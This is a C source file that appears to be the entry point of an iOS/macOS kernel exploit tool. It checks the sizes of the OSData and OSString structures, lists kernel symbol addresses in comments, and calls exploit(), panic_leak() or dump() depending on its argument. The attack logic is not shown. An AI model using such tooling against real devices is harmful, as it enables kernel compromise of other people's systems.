#include <string.h>             // strcmp
#include <unistd.h>             // sync

#include "common.h"             // ASSERT, WARN, log_init, log_release
#include "exploit.h"            // exploit, panic_leak
#include "io.h"                 // OSData, OSString

static void sanity()
{
    // In case we panic...
    sync();

#ifdef __LP64__
    ASSERT(sizeof(OSData) == 12 * sizeof(uint32_t));
    ASSERT(sizeof(OSString) == 8 * sizeof(uint32_t));
#else
    ASSERT(sizeof(OSData) == 7 * sizeof(uint32_t));
    ASSERT(sizeof(OSString) == 5 * sizeof(uint32_t));
#endif

    // TODO: sysctl("hw.cputype")
}

int main(int argc, const char **argv)
{
    // ffffff800445a1dc T _is_io_registry_entry_get_property_bytes
    // ffffff8004536000 S _ipc_kernel_map
    // ffffff8004536370 S __ZN8OSSymbol10gMetaClassE
    // ffffff8004536348 S __ZN8OSString10gMetaClassE

    // 6,1 ffffff80044eda08 S __ZTV11OSMetaClass
    // 8,4 ffffff80044ef460 S __ZTV11OSMetaClass

    // 8,4 ffffff80044ef1f0 S __ZTV8OSString

    int action = 0;
    size_t off;
    for(off = 1; off < argc; ++off)
    {
        if(strcmp(argv[off], "panic") == 0)
        {
            action = 1;
        }
        else if(strcmp(argv[off], "dump") == 0)
        {
            action = 2;
        }
        else
        {
            break;
        }
    }
    if(argc > off)
    {
        log_init(argv[off]);
        ++off;
    }
    else
    {
        log_init(NULL);
    }
    if(argc > off)
    {
        WARN("Too many arguments");
        return 1;
    }

    sanity();

    switch(action)
    {
        case 1:
            panic_leak();
            break;
        case 2:
            dump();
            break;
        default:
            exploit();
            break;
    }

    log_release();
    return 0;
}
